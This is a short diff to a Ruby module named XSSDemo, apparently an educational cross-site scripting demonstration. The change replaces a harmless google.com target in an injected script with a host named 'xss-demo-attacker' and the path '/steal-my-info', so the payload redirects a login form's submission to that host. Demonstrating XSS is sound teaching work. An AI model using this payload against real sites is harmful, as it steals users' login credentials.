@@ -15,7 +15,7 @@ module XSSDemo
       end
 
       def form_modification
-        js_payload = "Random User<script>$(document).ready(function() { document.getElementById('login_form').action = 'http://www.google.com'})</script>"
+        js_payload = "Random User<script>$(document).ready(function() { document.getElementById('login_form').action = 'http://xss-demo-attacker.herokuapp.com/steal-my-info'})</script>"
         params = {username: js_payload}
 
         build_url(params) 
